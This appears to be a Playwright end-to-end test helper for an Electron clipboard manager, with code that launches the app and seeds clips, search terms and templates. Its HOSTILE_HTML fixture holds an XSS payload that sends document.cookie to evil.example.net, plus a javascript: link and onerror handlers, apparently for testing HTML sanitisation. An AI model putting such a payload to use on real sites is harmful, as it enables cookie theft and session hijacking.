import { _electron as electron, type ElectronApplication, type Page } from '@playwright/test';
import { mkdtempSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join, resolve } from 'path';

const appPath = resolve(__dirname, '../out/main/index.js');
export const UNIQUE = Date.now().toString(36);

export const IP_A = '203.0.113.42';
export const IP_B = '198.51.100.7';
export const EMAIL = `mreyes-${UNIQUE}@example.com`;
export const CLIP_ONE = `alert ${UNIQUE}: failed logins from ${IP_A} for ${EMAIL}`;
export const CLIP_TWO = `second source ${UNIQUE}: ${IP_B} seen overnight`;

export const HOSTILE_HTML =
  `<p><b>Invoice ${UNIQUE}</b> is overdue. <a href="javascript:alert(1)">Pay now</a></p>` +
  '<script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
  '<img src="https://evil.example.net/pixel.gif" onerror="alert(2)">' +
  '<iframe src="https://evil.example.net/"></iframe><style>body{display:none}</style>';

export async function launchApp(): Promise<{ app: ElectronApplication; window: Page }> {
  const profileRoot = mkdtempSync(join(tmpdir(), 'clipless-quick-look-'));
  const userDataDir = join(profileRoot, 'profile');
  const app = await electron.launch({
    args: [appPath, `--user-data-dir=${userDataDir}`],
    env: { ...process.env, CLIPLESS_PLAINTEXT_STORAGE: '1' },
  });
  app.on('close', () => {
    try {
      rmSync(profileRoot, { recursive: true, force: true });
    } catch {}
  });
  await app.evaluate(({ clipboard }) => clipboard.clear());
  const window = await app.firstWindow();
  await window.waitForSelector('#root > *');
  await window.evaluate(async () => {
    await (window as any).api.storageClearAll();
  });
  await window.reload();
  await window.waitForSelector('#root > *');
  return { app, window };
}

export async function seedConfig(window: Page): Promise<void> {
  await window.evaluate(async () => {
    const api = (window as any).api;
    for (const t of await api.searchTermsGetAll()) await api.searchTermsDelete(t.id);
    for (const t of await api.quickToolsGetAll()) await api.quickToolsDelete(t.id);
    for (const t of await api.templatesGetAll()) await api.templatesDelete(t.id);
    await api.searchTermsCreate('IP', '(?<ip>\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b)');
    await api.searchTermsCreate('Email', '(?<email>[\\w.+-]+@[\\w-]+\\.[\\w.]+)');
    await api.quickToolsCreate('VirusTotal', 'https://www.virustotal.com/gui/ip-address/{ip}', [
      'ip',
    ]);
    await api.templatesCreate('IP block', 'Block {ip} reported by {email}');
  });
}

export async function seedTextClips(
  app: ElectronApplication,
  window: Page,
  texts: string[]
): Promise<void> {
  await window.evaluate(async () => {
    await (window as any).api.stopClipboardMonitoring();
  });
  await app.evaluate(({ clipboard }, text) => clipboard.writeText(text), texts[0]);
  await window.evaluate(async (contents) => {
    const clips = contents.map((content, index) => ({
      id: `quick-look-e2e-${index}`,
      type: 'text',
      content,
    }));
    await (window as any).api.storageSaveClips(clips, {});
  }, texts);
  await window.reload();
  await window.waitForSelector('#root > *');
}

export async function closeSearch(window: Page): Promise<void> {
  const bar = window.getByTestId('search-bar');
  if (!(await bar.isVisible())) return;
  await window.getByTestId('search-button').click();
  await bar.waitFor({ state: 'hidden' });
}

export const rowWith = (window: Page, text: string) =>
  window.locator('[data-testid="clip-row"]', { hasText: text }).first();
